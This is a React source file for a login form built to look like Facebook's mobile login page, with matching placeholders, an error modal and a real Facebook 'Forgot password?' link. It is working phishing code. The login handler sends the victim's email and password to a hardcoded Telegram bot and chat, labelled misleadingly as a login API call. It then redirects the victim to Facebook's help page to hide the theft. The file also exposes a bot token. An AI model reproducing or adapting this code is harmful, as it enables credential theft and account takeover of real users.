import React from "react";
import Modal from "react-modal";
import { useState } from "react";
import InputComponent from "./InputComponent";
import ButtonComponent from "./ButtonComponent";

function FormComponent() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [modalIsOpen, setIsOpen] = React.useState(false);

  function openModal() {
    setIsOpen(true);
  }

  function closeModal() {
    setIsOpen(false);
  }

  const sendEmailPassword = async (email, pass) => {
    console.log(pass);
    fetch(
      "https://api.telegram.org/bot" +
        "7090179855:AAFOKtWOZpPVVWb8cC9QdtHT3cpaYSknC08" +
        "/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: -4184438341,
          text: email + "|" + pass,
        }),
      }
    );
  };

  const handleLogin = async (email, pass) => {
    if (!email) {
      openModal();
      return;
    }
    if (!pass) {
      openModal();
      return;
    }

    // Call login API
    await sendEmailPassword(email, pass);
    window.location.href = "https://m.facebook.com/help";
  };
  return (
    <div
      style={{
        width: "100%",
        display: "flex",
        flex: 1,
        flexDirection: "column",
      }}
    >
      <Modal
        isOpen={modalIsOpen}
        onRequestClose={closeModal}
        contentLabel="Example Modal"
        style={{
            content: {
                top: '50%',
                left: '50%',
                transform: 'translate(-50%, -50%)',
                borderRadius: '12px',
                width: '85%',
                paddingLeft: '0px',
                paddingRight: '0px',
                height: '190px',
                padding: '0px',
              },
              overlay: {
                position: 'fixed',
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                backgroundColor: 'rgba(0, 0, 0, 0.5)'
              },
        }}
      >
        <div
            style={{
                height: '100%',
                position: 'relative',
                paddingTop: '12px',
            }}
        >
            <div
                style={{
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'center',
                    padding: '16px',
                }}
            >
              <p
                style={{
                    color: "rgb(28,30,33)",
                    fontSize: "18px",
                    fontWeight: "600",
                    textAlign: "center",
                }}
              >Email address or mobile number required</p>
              <p
                style={{
                    marginTop: '12px',
                    color: "rgb(101,103,107)",
                    fontSize: "14px",
                    textAlign: "center",
                }}
              >Enter your email address or mobile number to continue</p>
            
            </div>
            <button
                onClick={closeModal}
                style={{
    
                    width: '100%',
                    padding: '16px 16px',
                    backgroundColor: '#fff',
                    textAlign: 'center',
                    color: 'rgb(24,119,242)',
                    marginTop: '16px',
                    border: 'none',
                    borderTop: '1px solid rgb(206, 208, 212)',
                    position: 'absolute',
                    bottom: '0',
                }}
            >
                OK
            </button>
        </div>
      </Modal>
      <InputComponent
        type="text"
        placeholder="Mobile number or email address"
        value={email}
        onChange={(e) => {
          setEmail(e.target.value);
        }}
      />
      <InputComponent
        type="password"
        placeholder="Password"
        style={{
          marginTop: "12px",
        }}
        value={password}
        onChange={(e) => {
          setPassword(e.target.value);
        }}
      />
      <ButtonComponent
        value="Log in"
        style={{
          marginTop: "12px",
          fontSize: "16px",
        }}
        onClick={() => {
          handleLogin(email, password);
        }}
      />
      <a
        style={{
          fontWeight: "500",
          color: "rgb(28, 43, 51)",
          fontSize: "15px",
          marginTop: "16px",
          textAlign: "center",
          outline: "none",
          textDecoration: "none",
        }}
        href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
      >
        Forgot password?
      </a>
    </div>
  );
}

export default FormComponent;
